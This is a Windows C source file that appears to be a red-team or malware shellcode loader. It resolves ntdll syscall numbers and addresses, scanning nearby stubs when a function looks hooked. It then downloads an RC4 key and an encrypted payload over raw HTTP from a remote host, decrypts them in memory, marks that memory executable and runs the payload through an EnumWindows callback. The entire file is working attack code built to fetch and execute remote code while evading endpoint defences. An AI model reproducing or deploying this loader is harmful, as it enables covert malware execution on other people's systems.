#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include "define.h"

#pragma comment(lib, "Ws2_32.lib")

//#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

size_t szCalc;
size_t szKey;

SystemFunction032 jodRC4;

WORD GetSSN(HMODULE hNTDLL, char* Procedure) {
	DWORD FunctionSSN = 0;
	UINT_PTR addr = 0;

	addr = (UINT_PTR)GetProcAddress(hNTDLL, Procedure);

	if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) {
		BYTE high = *((PBYTE)addr + 4);
		BYTE low = *((PBYTE)addr + 5);
		return high;
	}

	if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
		for (int i = 1; i <= 500; i++) {
			PBYTE newADDR = (PBYTE)addr - i * 32;
			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
				BYTE high = *((PBYTE)newADDR + 5);
				BYTE low = *((PBYTE)newADDR + 4);
				return high;
			}
		}
	}

	if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
		for (int i = 1; i <= 500; i++) {
			PBYTE newADDR = (PBYTE)addr + i * 32;
			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
				BYTE high = *((PBYTE)newADDR + 5);
				BYTE low = *((PBYTE)newADDR + 4);
				return high;
			}
		}
	}

	FunctionSSN = *((PBYTE)(addr + 4));
	return FunctionSSN;
}

QWORD GetSyscallAdr(HMODULE hNTDLL, char* Procedure) {
	UINT_PTR addr = 0;

	addr = (UINT_PTR)GetProcAddress(hNTDLL, Procedure);

	if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) {
		LPVOID scall = (LPVOID)((INT_PTR)addr + 0x12);
		return (QWORD)scall;
	}

	if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
		for (int i = 1; i <= 500; i++) {
			PBYTE newADDR = (PBYTE)addr - i * 32;
			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
				LPVOID scall = (LPVOID)((INT_PTR)addr + 0x12);
				return (QWORD)scall;
			}
		}
	}

	if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
		for (int i = 1; i <= 500; i++) {
			PBYTE newADDR = (PBYTE)addr + i * 32;
			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
				LPVOID scall = (LPVOID)((INT_PTR)addr + 0x12);
				return (QWORD)scall;
			}
		}
	}

	QWORD SyscallAddr = (QWORD)((PBYTE)addr + 18);
	return SyscallAddr;
}

void Populate() {
	HANDLE hNtdll = GetModuleHandleW(L"ntdll");

	NtAllocateVirtualMemoryExSSN = GetSSN(hNtdll, "NtAllocateVirtualMemoryEx");
	NtProtectVirtualMemorySSN = GetSSN(hNtdll, "NtProtectVirtualMemory");


	NtAllocateVirtualMemoryExSyscall = GetSyscallAdr(hNtdll, "NtAllocateVirtualMemoryEx");
	NtProtectVirtualMemorySyscall = GetSyscallAdr(hNtdll, "NtProtectVirtualMemory");


	jodRC4 = (SystemFunction032)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction032");
}

struct Memory {
	char* data;
	size_t size;
};

struct Memory rc4Key, cipher;

int DownloadHttpToMemory(const char* host, char* port, const char* path, struct Memory* outMem) {
	WSADATA wsa;
	SOCKET sock = INVALID_SOCKET;
	struct addrinfo hints, * res = NULL;
	char sendbuf[1024];
	char recvbuf[4096];
	int bytes;

	outMem->data = NULL;
	outMem->size = 0;

	// Winsock startup
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		fprintf(stderr, "WSAStartup failed.\n");
		return 0;
	}

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	

#ifdef _DEBUG
	printf("[DEBUG] Resolving %s...\n", host);
#endif
	if (getaddrinfo(host, port, &hints, &res) != 0) {
		fprintf(stderr, "getaddrinfo failed.\n");
		WSACleanup();
		return 0;
	}
#ifdef _DEBUG
	printf("[DEBUG] Connecting to %s...\n", host);
#endif
	sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	if (sock == INVALID_SOCKET) {
		fprintf(stderr, "socket() failed.\n");
		freeaddrinfo(res);
		WSACleanup();
		return 0;
	}

	if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
		fprintf(stderr, "connect() failed.\n");
		closesocket(sock);
		freeaddrinfo(res);
		WSACleanup();
		return 0;
	}
	freeaddrinfo(res);
	snprintf(sendbuf, sizeof(sendbuf),
		"GET %s HTTP/1.0\r\n"
		"Host: %s\r\n"
		"User-Agent: RawHTTPClient/1.0\r\n"
		"Connection: close\r\n\r\n", path, host);
#ifdef _DEBUG
	printf("[DEBUG] Sending request:\n%s\n", sendbuf);
#endif
	send(sock, sendbuf, (int)strlen(sendbuf), 0);

#ifdef _DEBUG
	printf("[DEBUG] Reading response...\n");
#endif
	while ((bytes = recv(sock, recvbuf, sizeof(recvbuf), 0)) > 0) {
		char* tmp = realloc(outMem->data, outMem->size + bytes + 1);
		if (!tmp) {
			fprintf(stderr, "Out of memory.\n");
			closesocket(sock);
			WSACleanup();
			return 0;
		}
		outMem->data = tmp;
		memcpy(outMem->data + outMem->size, recvbuf, bytes);
		outMem->size += bytes;
	}

	closesocket(sock);
	WSACleanup();

	if (!outMem->data) {
		fprintf(stderr, "[!] No data received.\n");
		return 0;
	}

	outMem->data[outMem->size] = '\0'; // null terminate
#ifdef _DEBUG
	printf("[DEBUG] Total received: %zu bytes\n", outMem->size);
#endif
	// Remove headers
	char* bodyStart = strstr(outMem->data, "\r\n\r\n");
	if (bodyStart) {
		size_t headerLen = (bodyStart + 4) - outMem->data;
		size_t bodySize = outMem->size - headerLen;
		memmove(outMem->data, bodyStart + 4, bodySize);
		outMem->size = bodySize;
		outMem->data[outMem->size] = '\0';
	}
	else {
		fprintf(stderr, "[???] No HTTP header found.\n");
	}

	return 1;
}

void PopulateData(char* host, char* port, char* LocKey, char* LocCipher) {
	char URL[50] = "/";
	strcat_s(URL, 50, LocKey);
	info("Key Location: http://%s:%s%s", host, port,URL);

	char cURL[50] = "/";
	strcat_s(cURL, 50, LocCipher);
	info("Cipher Location: http://%s:%s%s", host, port,cURL);

	DownloadHttpToMemory(host,port, URL, &rc4Key);
	DownloadHttpToMemory(host,port, cURL, &cipher);
	szCalc = cipher.size;
	szKey = rc4Key.size;
}

int main(int argc, char* argv[]) {
	char *host;
	char *port;
	char *LocKey;
	char *LocCipher;


	if (argc < 4) {
#if _DEBUG
		ok("Will have to pull from code ugh");
		char* host = "127.0.0.1";
		char* port = "8080";
		char LocKey[] = "key.bin";
		char LocCipher[] = "cipher.bin";
		PopulateData(host, port, LocKey, LocCipher);
		Populate();
#else
		error("Provide the host, port, the key and the cipher \n%s <HOST> <PORT> <key.bin> <cipher.bin>", argv[0]);
		return 1;
#endif
	}
	else {
		host = argv[1];
		port = argv[2];
		LocKey = argv[3];
		LocCipher = argv[4];
		PopulateData(host, port, LocKey, LocCipher);
		Populate();
	}

	HANDLE hProcess = NtCurrentProcess();

	NTSTATUS ntError;

	size_t sz = 0x18E00;
	LPVOID rBuffer = NULL;
	ntError = NtAllocateVirtualMemoryEx(hProcess, &rBuffer, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, NULL, 0);
	if (ntError != STATUS_SUCCESS) {
		error("Could not reserve a memory space");
		yolo();
	}
	else {
		ok("Memory Allocated at 0x%p", &rBuffer);
	}

	ustring Key = { (DWORD)szKey, (DWORD)szKey, rc4Key.data };
	ustring shellBuff = { (DWORD)szCalc,(DWORD)szCalc, cipher.data };
	jodRC4(&shellBuff, &Key);

	if (sz > cipher.size) {
		memcpy_s(rBuffer, sz, cipher.data, cipher.size);
	}
	else {
		error("Shellcode needs more space: 0x%p", cipher.size);
		yolo();
	}

	ULONG old;
	ntError = NtProtectVirtualMemory(hProcess, &rBuffer, &szCalc, PAGE_EXECUTE_READ, &old);
	if (ntError != STATUS_SUCCESS) {
		error("Could not change memory protections");
		yolo();
	}
	else {
		ok("Memory Protections changed");
	}

	EnumWindows((WNDENUMPROC)rBuffer, 0); //Callback Function

	info("Closing all handles");

	ok("Exiting :)");

	return 0;
}